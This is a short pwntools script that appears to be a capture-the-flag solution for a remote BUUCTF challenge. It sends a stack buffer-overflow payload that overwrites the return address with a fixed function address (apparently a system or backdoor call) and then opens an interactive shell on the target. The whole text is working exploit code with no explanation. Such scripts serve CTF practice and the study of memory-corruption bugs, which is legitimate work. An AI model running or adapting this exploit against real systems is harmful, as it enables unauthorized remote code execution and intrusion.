from pwn import *
context.log_level='debug'
p = remote('node3.buuoj.cn',27731)
#p = process('./pwn')
sys_addr = 0x08048F0D
payload = 'I'*0x14 + 'A'*0x04 + p32(sys_addr)
p.sendline(payload)
p.interactive()